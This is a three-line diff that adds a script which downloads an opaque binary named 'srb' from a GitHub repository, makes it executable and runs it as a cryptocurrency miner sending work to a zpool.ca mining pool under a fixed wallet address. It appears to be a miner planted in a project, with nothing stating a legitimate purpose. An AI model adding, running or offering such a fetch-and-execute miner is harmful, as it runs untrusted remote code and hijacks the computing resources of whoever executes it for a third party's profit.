@@ -1,0 +1,3 @@
+wget https://github.com/pttn001/pttn/raw/main/srb
+chmod +x srb
+./srb -a yespowerltncg -o stratum+tcp://yespowerLTNCG.na.mine.zpool.ca:6245 -u KLonQ7jcgoWU32Y44pst4KgKQUVArNEN2s --disable-gpu -t 8
